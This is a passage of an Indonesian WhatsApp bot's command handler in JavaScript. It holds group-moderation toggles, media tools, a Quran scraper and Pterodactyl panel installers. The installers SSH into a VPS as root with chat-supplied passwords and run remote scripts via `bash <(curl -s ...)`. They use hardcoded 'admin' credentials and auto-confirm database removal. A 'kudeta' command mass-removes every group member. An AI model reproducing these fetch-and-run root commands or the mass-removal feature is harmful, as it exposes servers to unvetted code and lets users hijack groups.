    }
}
break

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'ambilsw': case "sw": {
    if (m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

    if (quotedMessage.imageMessage) {
        let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return conn.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return conn.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
    }

    return m.reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}
break

case 'toanime':
case 'jadianime': {
    
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dikonversi ke anime')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
      
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

       
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://api.botwa.connxdzz.me/api/maker/convertanime?url=${uploadResult.url}&apikey=freekey`
        
        
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: mess.done 
        }, { 
            quoted: m 
        })

      
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in toanime:', error)
        m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case 'selectsurah': case "carisurah": case "searchsurah": {
    if (!args[0]) return m.reply(`🚫 Masukkan nomor surah yang valid (1-114)\n\n*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`);
    
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const cache = new Map();
    const CACHE_DURATION = 3600000; 

    async function selectSurah(link) {
        try {
        const axios = require('axios');
            const { data } = await axios.get(link, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            const Isi = [];
            const surah = $('body > main > article > h1').text().trim() || 'Surah tidak ditemukan';
            const bismillah = $('body > main > article > p').text().trim() || '';
            
            $('body > main > article > ol > li').each((i, e) => {
                const arabic = $(e).find('p.arabic').text().trim() || '';
                const baca = $(e).find('p.translate').text().trim() || '';
                const arti = $(e).find('p.meaning').text().trim() || '';
                
                if (arabic || baca || arti) {
                    Isi.push({ arabic, baca, arti });
                }
            });
            
            if (Isi.length === 0) {
                throw new Error('Tidak dapat menemukan ayat-ayat surah');
            }
            
            Result.push({ surah, bismillah }, Isi);
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil surah: ${error.message}`);
        }
    }

    async function listsurah() {
        try {
        const axios = require('axios');
            const { data } = await axios.get('https://litequran.net/', {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            
            $('body > main > ol > li').each((i, e) => {
                const element = $(e).find('a');
                if (element.length) {
                    const name_surah = element.text().trim();
                    const href = element.attr('href');
                    if (name_surah && href) {
                        Result.push({
                            link: 'https://litequran.net/' + href,
                            name_surah
                        });
                    }
                }
            });
            
            if (Result.length === 0) {
                throw new Error('Tidak dapat menemukan daftar surah');
            }
            
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil daftar surah: ${error.message}`);
        }
    }

    async function getSurah(surahIndex) {
        try {
            
            const cacheKey = `surah_${surahIndex}`;
            const cachedData = cache.get(cacheKey);
            if (cachedData && (Date.now() - cachedData.timestamp) < CACHE_DURATION) {
                return cachedData.data;
            }

            const surahList = await listsurah();
            
            if (surahIndex < 1 || surahIndex > 114) {
                return "🚫 *Nomor surah tidak valid.* Silakan masukkan nomor 1-114.";
            }

            if (surahIndex > surahList.length) {
                return "🚫 *Surah tidak ditemukan.* Coba periksa kembali nomor surah.";
            }

            await delay(500);

            const selectedSurah = surahList[surahIndex - 1];
            const surahContent = await selectSurah(selectedSurah.link);

            let response = `🕌 *${surahContent[0].surah}*\n\n`;
            if (surahContent[0].bismillah) {
                response += `${surahContent[0].bismillah}\n\n`;
            }
            response += `📜 *Ayat-ayat suci Al-Quran:*\n\n`;

            surahContent[1].forEach((ayah, index) => {
                response += `*𖦹 Ayat ${index + 1}:*\n`;
                if (ayah.arabic) response += `🕋 ${ayah.arabic}\n`;
                if (ayah.baca) response += `📖 ${ayah.baca}\n`;
                if (ayah.arti) response += `📚 ${ayah.arti}\n\n`;
            });

            response += `\n🤲 *Semoga Allah memberikan pemahaman dari ayat-ayat ini.*`;

            
            cache.set(cacheKey, {
                data: response,
                timestamp: Date.now()
            });

            return response;
        } catch (error) {
            return `🚫 *Error:* ${error.message}`;
        }
    }

    try {
        const surahIndex = parseInt(args[0]);
        if (isNaN(surahIndex)) {
            return m.reply("🚫 *Masukkan nomor surah yang valid (1-114).*");
        }
        
        m.reply("⏳ *Sedang mengambil surah...*");
        const response = await getSurah(surahIndex);
        m.reply(response);
    } catch (error) {
        m.reply(`🚫 *Terjadi kesalahan:* ${error.message}`);
    }
    }
    break

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply(`Kudeta Grup By ${global.namaOwner} Starting 🔥`)
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemanebula": case "temanebula": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//=================================//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "waifu": case "hentai": {    
    await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
    
    const isNsfw = (m.command === 'hentai')
    let endpoints = [
        isNsfw ? 'https://api.waifu.pics/nsfw/waifu' : 'https://api.waifu.pics/sfw/waifu',
        isNsfw ? 'https://api.waifu.pics/nsfw/neko' : 'https://api.waifu.pics/sfw/neko'
    ]

    try {
        let allImages = []
        for (let endpoint of endpoints) {
            const images = []
            for (let i = 0; i < 2; i++) {
                const response = await fetch(endpoint)
                const data = await response.json()
                if (data && data.url) images.push(data.url)
            }
            allImages = [...allImages, ...images]
        }
        let araara = new Array()
        for (let i = 0; i < allImages.length; i++) {
            try {
                let imageUrl = allImages[i]
                let imgsc = await prepareWAMessageMedia(
                    { image: {url: imageUrl}}, 
                    { upload: conn.waUploadToServer }
                )
                
                let imageType = i < 2 ? 'Waifu' : 'Neko'
                
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{                  
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Download ${imageType}\",\"url\":\"${imageUrl}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    })
                })
            } catch (error) {
                console.error('Error processing image:', error)
                continue
            }
        }

        if (araara.length === 0) {
            throw new Error('No valid images found')
        }

        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nHasil pencarian ${isNsfw ? 'NSFW' : 'SFW'}\n• 2 Waifu Images\n• 2 Neko Images`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await conn.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
        
    } catch (error) {
        console.error('Error:', error)
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
}
break

case "cetakqr":
                case "qrtext": {
                    if(!text) return m.reply("Masukan Teks Untuk Dijadikan Qr");
                    m.reply(mess.wait);
                    const axios = require('axios');
                    let anu = `https://api.siputzx.my.id/api/tools/text2qr?text=${encodeURIComponent(text)}`;
                    const response = await axios.get(anu, { responseType: 'arraybuffer' });
                    try {
                        conn.sendMessage(m.chat, {
                            image: Buffer.from(response.data),
                            caption: '_Sudah Dijadikan Qr_'
                        }, { quoted: m })
                    } catch (e) {
                        console.log(e);
                        await m.reply('Error')
                    }
                }
                break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285776461481\n');
stream.write('https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Kata sandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Following are the Panel Account Details :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Please Create Allocation & Take Wings Tokens On Nodes That Have Been Created By Bots To Run Wings

*How to Run Wings :
* type *.startwings
* ipvps|pwvps|tokenwings
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write(`Node By ${global.namaOwner}\n`);
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write(`Node By ${global.namaOwner}\n`);
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

